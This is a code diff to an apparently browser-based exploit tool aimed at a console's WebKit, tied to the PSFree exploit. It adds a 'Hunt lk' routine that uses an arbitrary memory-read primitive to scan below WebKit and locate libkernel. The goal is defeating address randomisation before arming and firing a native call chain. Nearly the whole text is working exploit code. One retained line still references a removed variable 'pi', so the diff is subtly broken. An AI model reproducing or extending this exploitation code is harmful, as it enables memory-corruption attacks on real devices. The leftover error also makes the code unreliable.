@@ -49,13 +49,14 @@ import {
     plausibleHeapCell,
     resolveExtModuleHunt,
     resolveExtModuleHuntDiag,
-    huntLibkernelBelowWebkit,
+    huntLibkernelBelowWebkitChunk,
+    scanPoopsImportChunk,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831x";
+const BUILD_ID = "rw-20250831y";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -228,7 +229,10 @@ function setUi() {
     }
     if (btnLoadCal) btnLoadCal.disabled = busy || !ready;
     if (btnForceLk) btnForceLk.disabled = busy || !ready;
-    if (btnGuessLk) btnGuessLk.disabled = busy || !ready;
+    if (btnGuessLk) {
+        btnGuessLk.disabled = !ready || (busy && !huntLkAuto);
+        btnGuessLk.textContent = huntLkAuto ? "Hunting lk…" : "Hunt lk";
+    }
     if (btnPsfreeLite) {
         btnPsfreeLite.disabled = !ready || (busy && !findLkAuto);
         btnPsfreeLite.textContent = "Scan GOT lite";
@@ -238,7 +242,7 @@ function setUi() {
         btnPsfreeLk.textContent = "Scan GOT";
     }
     if (btnPsfreeStop) {
-        btnPsfreeStop.disabled = !findLkAuto && !psfreeAutoScan;
+        btnPsfreeStop.disabled = !findLkAuto && !psfreeAutoScan && !huntLkAuto;
         btnPsfreeStop.textContent = "Stop find";
     }
     if (btnPeek) btnPeek.disabled = busy || !ready;
@@ -456,6 +460,9 @@ const CAL_VTABLE_PTRS = [
 const SS_CAL_EXT_PTRS = "wk-cal-ext-ptrs";
 let calPtrIdx = 0;
 let guessLkIdx = 0;
+let huntLkState = null;
+let huntLkAuto = false;
+let huntLkStage = "below";
 let calLkCands = null;
 let psfreePltState = null;
 let psfreeAutoScan = false;
@@ -2031,51 +2038,10 @@ function runVerifyLk() {
     }
 
     try {
-        const pass = verifyPassIdx % 3;
-        verifyPassIdx++;
-
-        if (pass === 2) {
-            if (!webkitBase) {
-                mark("LK-SKIP", "below-wk — no webkitBase");
-                renderOut();
-                return;
-            }
-            const wbKey = String(webkitBase);
-            if (belowWkBaseKey !== wbKey) {
-                belowWkBaseKey = wbKey;
-                belowWkOffset = 0;
-            }
-            mark("LK-BELOW-WK", "offset=" + belowWkOffset + " pages=8");
-            const below = huntLibkernelBelowWebkit(p, webkitBase, off, belowWkOffset, 8);
-            belowWkOffset += 8;
-            if (belowWkOffset >= 160) belowWkOffset = 0;
-
-            if (below && below.lk) {
-                saveLibkernelSession(below.lk, null);
-                if (addrIn) addrIn.value = String(below.lk);
-                mark("LK-RESOLVE-OK", "below-wk → " + below.lk + " via " + below.via
-                    + " stubs=" + below.stubs + " off=" + below.offset);
-                mark("LK-VERIFY-WARN", String(below.lk) + " — Force lk → Arm → Fire");
-                state("below-wk hit — Force lk → Arm", "warn");
-                renderOut();
-                crashLog.append("VERIFY below-wk " + below.lk, "LK-VERIFY");
-                crashLog.flushSync();
-                return;
-            }
-
-            mark("LK-RESOLVE-MISS", "below-wk off=" + (below.offset != null ? below.offset : belowWkOffset)
-                + " bestStubs=" + (below.bestStubs != null ? below.bestStubs : 0)
-                + " — ext ptrs are not libkernel");
-            state("below-wk miss — tap Verify (cycles below/ext)", "bad");
-            renderOut();
-            crashLog.append("VERIFY FAIL below-wk off=" + belowWkOffset, "LK-VERIFY");
-            crashLog.flushSync();
-            return;
-        }
-
         const passNames = ["mod12", "mod16"];
         const passPages = [12, 16];
-        const pi = pass;
+        const pass = verifyPassIdx % passNames.length;
+        verifyPassIdx++;
         const isAlignedBase = (ptr.low & 0x3fff) === 0;
 
         if (isAlignedBase) {
@@ -2098,10 +2064,10 @@ function runVerifyLk() {
                 return;
             }
         } else {
-            mark("LK-EXT-FN", hex + " — " + passNames[pi] + " (WebCore import, not lk base)");
+            mark("LK-EXT-FN", hex + " — " + passNames[pass] + " (not lk — use Hunt lk)");
         }
 
-        const diag = resolveExtModuleHuntDiag(p, ptr, webkitBase, off, passPages[pi]);
+        const diag = resolveExtModuleHuntDiag(p, ptr, webkitBase, off, passPages[pass]);
         const resolved = diag.hit;
         if (resolved) {
             saveLibkernelSession(resolved.lk, resolved.iatRva);
@@ -2124,9 +2090,9 @@ function runVerifyLk() {
 
         const hdrNote = diag.hdr ? (" hdr=1 stubs=" + (diag.stubs != null ? diag.stubs : "?"))
             : (" hdr=0 walked=" + (diag.walked != null ? diag.walked : "?"));
-        mark("LK-RESOLVE-MISS", hex + " pass=" + passNames[pi] + hdrNote);
+        mark("LK-RESOLVE-MISS", hex + " pass=" + passNames[pass] + hdrNote);
         cycleExtPtrInHex();
-        mark("LK-HINT", "every 3rd Verify = below-wk (libkernel under webkit)");
+        mark("LK-HINT", "tap Hunt lk — uses webkitBase, scans 32MB below");
         state("ext miss — tap Verify for below-wk", "bad");
         renderOut();
         crashLog.append("VERIFY FAIL " + hex + " " + passNames[pi] + hdrNote, "LK-VERIFY");
@@ -2141,8 +2107,6 @@ function runVerifyLk() {
 
 let extResolveIdx = 0;
 let verifyPassIdx = 0;
-let belowWkOffset = 0;
-let belowWkBaseKey = "";
 
 function loadExtPtrAt(idx) {
     try {
@@ -2248,7 +2212,7 @@ function finishFindLkChunk(chunk) {
             crashLog.flushSync();
 
             if (addrIn && hexes[0]) addrIn.value = hexes[0];
-            mark("LK-HINT", "Verify lk: mod12/mod16 on ext ptrs, every 3rd = below-wk");
+            mark("LK-HINT", "tap Hunt lk (webkitBase → 32MB below + poops imports)");
             mark("LK-MISS", "ext saved — zero finish reads build=" + BUILD_ID);
         } else if (chunk.cells === 0) {
             mark("LK-HINT", "no cells — re-run Start");
@@ -2270,6 +2234,7 @@ function finishFindLkChunk(chunk) {
 
 function stopFindLk() {
     findLkStop = true;
+    huntLkAuto = false;
     psfreeAutoStop = true;
     state("Find lk stopping…", "warn");
 }
@@ -2389,25 +2354,116 @@ async function runFindLkAuto(preset) {
     }
 }
 
-function runGuessLk() {
-    if (!ready || busy) return;
-    const { webkitBase } = basesFromSession(loadEffectiveOff());
-    if (!webkitBase) {
-        mark("LK-SKIP", "no webkitBase — Start first");
-        return;
-    }
-    const cands = estimateLibkernelCandidates(webkitBase, null);
-    if (!cands.length) {
-        mark("LK-SKIP", "no wk-relative guesses");
-        return;
-    }
-    if (guessLkIdx >= cands.length) guessLkIdx = 0;
-    const c = cands[guessLkIdx++];
-    const hex = c.hex.replace(/^0x/i, "");
-    if (addrIn) addrIn.value = hex;
-    mark("LK-GUESS", c.hex + " (" + c.why + ") 0 reads — Force lk → Arm → Fire");
-    state("wk guess " + guessLkIdx + "/" + cands.length, "warn");
+function finishHuntLkHit(chunk) {
+    huntLkAuto = false;
+    huntLkState = null;
+    busy = false;
+    if (addrIn && chunk.lk) addrIn.value = String(chunk.lk);
+    mark("LK-HUNT-OK", (chunk.source || chunk.phase) + " → " + chunk.lk
+        + " stubs=" + (chunk.stubs != null ? chunk.stubs : "?")
+        + " build=" + BUILD_ID);
+    state("Hunt lk OK — Force lk → Arm → Fire", "ok");
+    setUi();
     renderOut();
+    crashLog.append("LK-HUNT-OK " + chunk.lk, "LK-HUNT");
+    crashLog.flushSync();
+}
+
+async function runHuntLkBelow() {
+    if (!ready || !window.p || huntLkAuto) return;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const { webkitBase } = basesFromSession(off);
+    if (!webkitBase) {
+        mark("LK-SKIP", "Hunt lk — Save bases first (need webkitBase)");
+        renderOut();
+        return;
+    }
+    huntLkAuto = true;
+    huntLkState = null;
+    huntLkStage = "below";
+    busy = true;
+    setUi();
+    mark("LK-HUNT", "webkit=" + webkitBase + " build=" + BUILD_ID);
+    renderOut();
+
+    let ticks = 0;
+    try {
+        while (huntLkAuto && ticks++ < 5000) {
+            let chunk;
+            if (huntLkStage === "below") {
+                chunk = huntLibkernelBelowWebkitChunk(p, webkitBase, off, huntLkState, {
+                    maxPages: 2048,
+                    batchPages: 6,
+                });
+                huntLkState = chunk.state;
+                if (chunk.phase === "hunt-start") {
+                    mark("LK-HUNT", "≤32MB below webkit SCE/stub scan");
+                } else if (chunk.phase === "hunt") {
+                    state("Hunt lk p=" + chunk.pages + " mods=" + chunk.modules, "warn");
+                }
+                if (chunk.done && chunk.ok) {
+                    finishHuntLkHit(chunk);
+                    return;
+                }
+                if (chunk.done) {
+                    mark("LK-HUNT", "below miss p=" + (chunk.pages || 0)
+                        + " mods=" + (chunk.modules || 0) + " — poops RELRO");
+                    huntLkStage = "imp";
+                    huntLkState = null;
+                }
+            } else {
+                chunk = scanPoopsImportChunk(p, webkitBase, off, huntLkState, {});
+                huntLkState = chunk.state;
+                if (chunk.phase === "imp-start") {
+                    mark("LK-HUNT", "poops imports " + (chunk.span || ""));
+                } else if (chunk.phase === "imp" || chunk.phase === "imp-region") {
+                    state("Hunt lk imp tried=" + (chunk.tried || 0), "warn");
+                } else if (chunk.phase === "imp-skip") {
+                    mark("LK-HUNT-MISS", "all paths miss — paste lk base if you have one");
+                    state("hunt miss", "bad");
+                    break;
+                }
+                if (chunk.done && chunk.ok) {
+                    finishHuntLkHit(chunk);
+                    return;
+                }
+                if (chunk.done) {
+                    mark("LK-HUNT-MISS", "pages=" + (chunk.pages || "?")
+                        + " — libkernel not found from webkitBase alone");
+                    state("hunt miss — need dump or manual base", "bad");
+                    break;
+                }
+            }
+            if (ticks % 6 === 0) {
+                renderOut();
+                crashLog.flushSync();
+            }
+            await new Promise(function (r) { setTimeout(r, 20); });
+        }
+        if (ticks >= 5000)
+            mark("LK-HUNT-ABORT", "tick cap — re-tap Hunt lk");
+    } catch (err) {
+        mark("LK-HUNT-ERR", err.message || String(err));
+        state("hunt error", "bad");
+    } finally {
+        huntLkAuto = false;
+        huntLkState = null;
+        busy = false;
+        setUi();
+        renderOut();
+        crashLog.flushSync();
+    }
+}
+
+function runGuessLk() {
+    runHuntLkBelow().catch(function (err) {
+        mark("LK-HUNT-ERR", err.message || String(err));
+        huntLkAuto = false;
+        busy = false;
+        setUi();
+        renderOut();
+    });
 }
 
 function finishPsfreeChunk(chunk) {
